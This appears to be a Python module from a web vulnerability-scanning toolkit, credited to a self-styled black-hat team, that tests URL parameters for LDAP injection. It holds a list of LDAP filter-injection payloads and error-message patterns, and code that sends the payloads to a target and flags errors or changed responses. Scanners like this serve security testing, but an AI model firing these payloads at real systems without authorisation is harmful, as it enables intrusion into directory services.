# modules/vuln_scanner/ldap_injection.py

"""
LDAP Injection Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects LDAP injection vulnerabilities through
parameter manipulation and response analysis.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from requests.exceptions import RequestException


class LDAPInjectionScanner:
    """
    LDAP injection vulnerability scanner.
    
    Tests for LDAP injection using common LDAP
    metacharacters and payload patterns.
    """
    
    LDAP_PAYLOADS = [
        "*",
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*)",
        "*)(&(objectClass=*))",
        "*)(uid=*",
        "admin)(&)",
        "admin)(!(objectClass=*)",
        "*)(cn=*))(|(cn=*",
        "*)%00",
        "*))%00",
    ]
    
    LDAP_ERROR_PATTERNS = [
        r'LDAP',
        r'ldap_search',
        r'ldap_bind',
        r'ldap_connect',
        r'javax\.naming',
        r'DirectorySearcher',
        r'SearchResult',
        r'com\.novell\.ldap',
        r'ObjectClass',
        r'distinguishedName',
        r'Invalid DN syntax',
        r'Bad search filter',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the LDAP injection scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract URL parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(self, url: str, parameter: str) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for LDAP injection.
        
        Args:
            url: Target URL
            parameter: Parameter name
            
        Returns:
            Dictionary with finding or None
        """
        for payload in self.LDAP_PAYLOADS[:5]:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = self.extract_parameters(url)
            params[parameter] = payload
            
            test_url = base_url + '?' + urlencode(params)
            
            try:
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
                
                for pattern in self.LDAP_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'error_matched': pattern,
                            'status_code': response.status_code,
                        }
                
                normal_response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
                
                if len(response.content) != len(normal_response.content):
                    return {
                        'url': test_url,
                        'parameter': parameter,
                        'payload': payload,
                        'type': 'boolean_based',
                        'original_length': len(normal_response.content),
                        'test_length': len(response.content),
                    }
                    
            except RequestException:
                continue
        
        return None
    
    def run(self) -> Dict[str, Any]:
        """
        Run LDAP injection scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            result = self.test_parameter(self.target, param_name)
            
            if result:
                self.vulnerabilities.append(result)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'LDAP Injection',
                'severity': 'high',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"LDAP injection detected in parameter '{vuln['parameter']}'",
                'evidence': vuln,
                'remediation': 'Use parameterized LDAP queries. Sanitize user input. Escape LDAP metacharacters.',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }